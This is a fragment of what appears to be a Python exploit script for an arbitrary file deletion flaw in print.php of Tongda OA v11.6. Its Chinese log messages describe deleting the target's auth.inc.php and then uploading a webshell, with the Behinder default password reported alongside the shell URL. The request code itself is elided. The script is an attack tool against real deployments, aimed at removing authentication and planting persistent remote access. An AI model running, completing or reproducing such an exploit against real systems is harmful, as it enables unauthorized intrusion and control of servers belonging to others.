...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测通达OA v11.6 print.php 任意文件删除漏洞，删除auth.inc.php中")
    try:
        ...
        if 'No input file specified.' not in response.text:
            print(now_time() + " [WARNING]  删除auth.inc.php失败")
        else:
            print(now_time() + ' [SUCCESS]  删除auth.inc.php成果，正在上传')
            ...
            if 'No input file specified.' not in shell:
                print(now_time() + ' [SUCCESS]  上传webshell成功,冰蝎默认密码:{}'.format(shell_url))
            else:
                print(now_time() + ' [WARNING]  上传文件失败，可能漏洞利用失败')
    except:
        print(now_time() + " [ERROR]    未知错误，或无法连接目标 ")
